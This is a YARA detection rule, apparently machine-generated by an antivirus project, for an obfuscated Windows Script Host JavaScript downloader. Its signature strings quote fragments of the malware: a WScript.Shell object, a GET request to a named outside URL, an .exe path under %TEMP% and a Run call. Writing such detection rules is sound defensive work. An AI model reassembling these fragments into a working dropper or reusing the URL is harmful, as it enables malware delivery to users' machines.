rule sig_20160401_bf3ba036e5c13d1ecf9adae9a35da47d {
  meta:
    description = "datamaliciousorder - file 20160401_bf3ba036e5c13d1ecf9adae9a35da47d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3a9d00236d24205a34447e21392c6b2fbab338dc2b3b8fc5ac892f9ac27c614b"

  strings:
    $s1  = "var IuZgk = function VbTgf() {return WScript[CyuHgr](\"WScript\"+\".Shell\");}(), DhPel = 11;" fullword ascii
    $s2  = "function NnIu(DlGlf, CmuVh){CzKm = CzKm * 1; return DlGlf - CmuVh;};" fullword ascii
    $s3  = "if (PuAa[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "PuAa[BetWxr](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s5  = "function LzqRqw(){return CliGxm + \"\";};" fullword ascii
    $s6  = "function NtYlw() {return IuZgk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0NyNafZvn38Lnpd.ex\" + \"e\";};" fullword ascii
    $s7  = "function VyVjy() {return ((DboVz == true) && (DboVz == EmUg)) ? 1 : CzKm;};" fullword ascii
    $s8  = "}while (JwMjy);" fullword ascii
    $s9  = "var DboVz = false;" fullword ascii
    $s10 = "return NnIu(JbYe, GkGag);" fullword ascii
    $s11 = "var AiRng = new this[\"Date\"]();" fullword ascii
    $s12 = "function BsPw(){return CyuHgr;};" fullword ascii
    $s13 = "function TjAc(){return 23;};" fullword ascii
    $s14 = "var RrSf = false;" fullword ascii
    $s15 = "function IbbZka(FgQt){IuZgk[\"R\"+\"un\"](FgQt, CzKm, CzKm);};" fullword ascii
    $s16 = "var EmUg = false;" fullword ascii
    $s17 = "function MlzQri()" fullword ascii
    $s18 = "DboVz = true; " fullword ascii
    $s19 = "EmUg = true; " fullword ascii
    $s20 = "function DhBqy(LuLhf) {var DfzBfj = (1, 2, 3, 4, 5, LuLhf); return DfzBfj;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}